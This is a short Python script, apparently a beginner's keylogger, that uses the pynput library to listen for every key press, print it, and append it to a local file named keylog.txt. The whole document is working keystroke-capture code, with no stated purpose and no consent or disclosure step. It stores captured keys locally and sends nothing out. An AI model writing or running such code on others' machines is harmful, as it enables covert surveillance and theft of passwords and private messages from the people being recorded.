from pynput import keyboard

def keypressed(key):
    print(str(key))
    print(type(key))
    with open("keylog.txt", 'a') as keylog:
        try:
            chkey = key.char
            keylog.write(chkey + "\n")
        except:
            pressedkey = str(key)[4:]
            keylog.write(pressedkey + "\n")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()